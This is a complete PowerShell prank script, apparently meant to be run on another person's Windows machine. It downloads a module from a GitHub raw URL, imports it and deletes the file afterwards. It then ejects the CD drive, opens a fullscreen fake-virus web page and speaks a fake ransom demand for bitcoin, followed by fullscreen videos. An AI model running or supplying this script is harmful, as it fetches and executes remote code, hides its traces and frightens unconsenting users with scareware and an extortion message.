Invoke-WebRequest -Uri "https://raw.githubusercontent.com/perplexityjeff/PowerShell-Troll/master/PSTrollFunctions.psm1" -OutFile "PSTrollFunctions.psm1";
Import-Module .\PSTrollFunctions.psm1;
rm PSTrollFunctions.psm1;
Open-CDDrive
Start-Process msedge.exe --kiosk https://geekprank.com/fake-virus/ --edge-kiosk-type=fullscreen
Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;
$speak.Speak("You Have Been Hack, a crypto locker will execute, send bitcoin to my address now");
Start-Sleep -s 6;
Get-Process msedge | Stop-Process
Start-Sleep -s 2;
Start-Process msedge.exe --kiosk https://www.youtube.com/embed/xvFZjo5PgG0?autoplay=1 --edge-kiosk-type=fullscreen
get-process msedge | stop-process
Start-Sleep -s 10;
Start-Process msedge.exe --kiosk https://www.youtube.com/watch?v=BYIzxLIW71E?autoplay=1 --edge-kiosk-type=fullscreen
get-process msedge | stop-process
Start-Sleep -s 72;
$speak.Speak("have you see the quenouille!");
